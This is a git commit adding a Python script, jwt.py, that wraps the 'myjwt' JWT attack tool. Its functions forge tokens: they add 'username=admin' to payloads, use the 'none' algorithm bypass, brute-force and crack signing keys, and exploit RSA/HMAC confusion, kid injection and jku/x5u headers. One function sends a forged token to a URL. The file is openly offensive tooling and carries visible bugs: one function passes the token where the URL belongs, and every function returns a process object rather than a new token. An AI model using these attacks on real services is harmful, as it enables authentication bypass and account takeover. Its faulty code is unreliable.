f0db34134f1ae9190c8c8e4e6ec20a12d57342d4
Amira Soliman Ahmed <aahmed.ext@orange.com>
2021-03-14 19:41:36 +0200

    Add files via upload
    add jwt lib

---
+++ jwt.py
@@ -0,0 +1,77 @@
+import sys
+import os
+
+import subprocess
+
+# # implement pip as a subprocess:
+# subprocess.check_call([sys.executable, '-m', 'pip', 'install','myjwt'])
+#
+# # process output with an API in the subprocess module:
+# reqs = subprocess.check_output([sys.executable, '-m', 'pip',
+#                                 'myjwt'])
+# installed_packages = [r.decode().split('==')[0] for r in reqs.split()]
+#
+# print(installed_packages)
+
+def modify_your_JWT ( jwt ):
+     print(jwt)
+     new_jwt = subprocess.run(["myjwt", jwt, "--add-payload" , "username=admin", "--add-header", "refresh=false"])
+     print(new_jwt)
+     return new_jwt
+
+
+def none_vulnerability ( jwt ):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--none""-vulnerability"])
+    print(new_jwt)
+    return new_jwt
+
+def sign_key ( jwt ,key):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--sign", key])
+    print(new_jwt)
+    return new_jwt
+
+def brute_force ( jwt ,path):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--bruteforce", path])
+    print(new_jwt)
+    return new_jwt
+
+def Crack ( jwt ,regex):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--regex", regex])
+    print(new_jwt)
+    return new_jwt
+
+def RSA_HMAC_confusion ( jwt ,file):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--hmac", file])
+    print(new_jwt)
+    return new_jwt
+
+def kid_injection ( jwt ):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--kid", "INJECTION"])
+    print(new_jwt)
+    return new_jwt
+
+def send_your_new_Jwt_to_url ( jwt ):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "-u", jwt, "-c", "jwt=", jwt,
+                              "--none""-vulnerability", "--add-payload" , "username=admin"])
+    print(new_jwt)
+    return new_jwt
+
+def Jku_vulnerability ( jwt ,url):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--jku", url])
+    print(new_jwt)
+    return new_jwt
+
+def X5U_vulnerability ( jwt ,url):
+    print(jwt)
+    new_jwt = subprocess.run(["myjwt", jwt, "--x5u", url])
+    print(new_jwt)
+    return new_jwt
+
